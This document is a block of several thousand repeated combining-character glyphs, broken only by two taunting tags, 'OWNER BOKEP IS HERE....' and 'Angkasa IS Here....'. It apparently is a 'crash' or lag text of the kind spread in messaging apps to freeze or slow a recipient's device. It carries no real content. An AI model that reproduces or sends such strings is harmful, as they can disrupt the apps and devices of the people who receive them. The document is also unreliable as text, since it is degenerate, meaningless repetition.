҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝OWNER BOKEP IS HERE....҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝𝐀𝐧𝐠𝐤𝐚𝐬𝐚 IS Here....҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝